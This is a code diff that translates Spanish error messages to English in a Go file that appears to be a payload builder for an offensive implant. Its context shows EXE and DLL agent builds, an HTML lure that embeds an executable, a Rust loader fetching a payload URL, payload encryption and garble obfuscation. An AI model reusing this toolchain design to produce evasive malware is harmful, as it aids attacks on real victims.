@@ -171,7 +171,7 @@ func BuildEXE(cfg BuildConfig, outDir string) (string, error) {
 	root := projectRoot()
 	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
-		return "", fmt.Errorf("crear directorio: %w", err)
+		return "", fmt.Errorf("create directory: %w", err)
 	}
 	arch := normalizeArch(cfg.Arch)
 	outPath := filepath.Join(outDir, agentName(cfg, ".exe"))
@@ -202,7 +202,7 @@ func BuildEXEStream(cfg BuildConfig, outDir string, progress io.Writer) (string,
 	root := projectRoot()
 	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
-		return "", fmt.Errorf("crear directorio: %w", err)
+		return "", fmt.Errorf("create directory: %w", err)
 	}
 	arch := normalizeArch(cfg.Arch)
 	outPath := filepath.Join(outDir, agentName(cfg, ".exe"))
@@ -398,7 +398,7 @@ func BuildDLL(cfg BuildConfig, outDir string) (string, error) {
 		cc = "i686-w64-mingw32-gcc"
 	}
 	if _, err := exec.LookPath(cc); err != nil {
-		return "", fmt.Errorf("mingw no encontrado (%s): apt install gcc-mingw-w64", cc)
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64", cc)
 	}
 	gobin, err := findGo()
 	if err != nil {
@@ -975,7 +975,7 @@ func findSRDIScript() (string, error) {
 func BuildHTML(exePath, outDir, lureName string) (string, error) {
 	data, err := os.ReadFile(exePath)
 	if err != nil {
-		return "", fmt.Errorf("leer exe: %w", err)
+		return "", fmt.Errorf("read exe: %w", err)
 	}
 	encoded := base64.StdEncoding.EncodeToString(data)
 	if lureName == "" {
@@ -1299,7 +1299,7 @@ func BuildRustLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (str
 func EncryptPayload(binPath, method, outDir string) (encPath, stubPath string, err error) {
 	data, err := os.ReadFile(binPath)
 	if err != nil {
-		return "", "", fmt.Errorf("leer bin: %w", err)
+		return "", "", fmt.Errorf("read bin: %w", err)
 	}
 
 	var key, encrypted []byte
@@ -1350,7 +1350,7 @@ func EncryptPayload(binPath, method, outDir string) (encPath, stubPath string, e
 		encrypted = gcm.Seal(nonce, nonce, data, nil)
 
 	default:
-		return "", "", fmt.Errorf("método desconocido: %s (usa xor, aes o poly)", method)
+		return "", "", fmt.Errorf("unknown method: %s (use xor, aes or poly)", method)
 	}
 
 	encBase := strings.TrimSuffix(filepath.Base(binPath), filepath.Ext(filepath.Base(binPath)))
@@ -1737,13 +1737,13 @@ func findGoOrGarble(useGarble bool) (string, error) {
 				strings.Contains(s, "please upgrade") ||
 				strings.Contains(s, "is too new") ||
 				strings.Contains(s, "aren't available") {
-				return "", fmt.Errorf("garble incompatible con el Go instalado (%s).\n"+
-					"Instala la versión correcta: go install mvdan.cc/garble@v0.15.0\nDetalle: %s",
+				return "", fmt.Errorf("garble incompatible with the installed Go version (%s).\n"+
+					"Install the correct version: go install mvdan.cc/garble@v0.15.0\nDetail: %s",
 					goVersion(), strings.TrimSpace(s))
 			}
 			return c, nil
 		}
-		return "", fmt.Errorf("garble no encontrado; instala: go install mvdan.cc/garble@latest")
+		return "", fmt.Errorf("garble not found; install: go install mvdan.cc/garble@latest")
 	}
 	return findGo()
 }
@@ -1772,7 +1772,7 @@ func findGo() (string, error) {
 			return c, nil
 		}
 	}
-	return "", fmt.Errorf("go no encontrado; instala golang-go")
+	return "", fmt.Errorf("go not found; install golang-go")
 }
 
 func normalizeArch(arch string) string {
